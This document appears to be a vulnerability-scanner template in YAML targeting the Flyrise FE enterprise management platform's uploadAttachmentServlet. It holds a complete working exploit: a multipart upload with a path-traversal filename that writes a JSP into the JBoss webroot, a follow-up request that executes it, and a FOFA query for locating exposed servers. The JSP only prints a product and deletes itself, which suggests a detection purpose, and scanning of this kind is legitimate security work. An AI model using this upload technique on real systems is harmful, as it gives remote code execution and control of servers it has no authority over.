http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, '{{result}}')
    type: dsl
  raw:
  - 'POST /servlet/uploadAttachmentServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary={{boundary}}


    --{{boundary}}

    Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/{{filename}}"

    Content-Type: text/plain


    <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();
    %>

    --{{boundary}}

    Content-Disposition: form-data; name="json"


    {"iq":{"query":{"UpdateType":"mail"}}}

    --{{boundary}}--

    '
  - 'GET /{{filename}}; HTTP/1.1

    Host: {{Hostname}}

    '
id: flyrise-fe-uploadAttachmentServlet-uploadfile
info:
  author: Co5mos
  description: "\u98DE\u4F01\u4E92\u8054-FE\u4F01\u4E1A\u8FD0\u8425\u7BA1\u7406\u5E73\
    \u53F0\u7684uploadAttachmentServlet\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\
    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u5229\u7528\u8BE5\u6F0F\u6D1E\u4E0A\
    \u4F20\u6076\u610F\u6587\u4EF6\uFF0C\u4ECE\u800C\u63A7\u5236\u670D\u52A1\u5668\
    \u6216\u7A83\u53D6\u654F\u611F\u4FE1\u606F\u3002\n"
  metadata:
    fofa-query: "app=\"FE-\u534F\u4F5C\u5E73\u53F0\""
  name: FE-Enterprise Management Platform Arbitrary File Upload
  severity: high
  tags: flyrise, rce, file-upload
variables:
  boundary: '{{rand_base(20)}}'
  filename: '{{rand_base(6)}}.jsp'
  num1: '{{rand_int(10000, 20000)}}'
  num2: '{{rand_int(10000, 20000)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
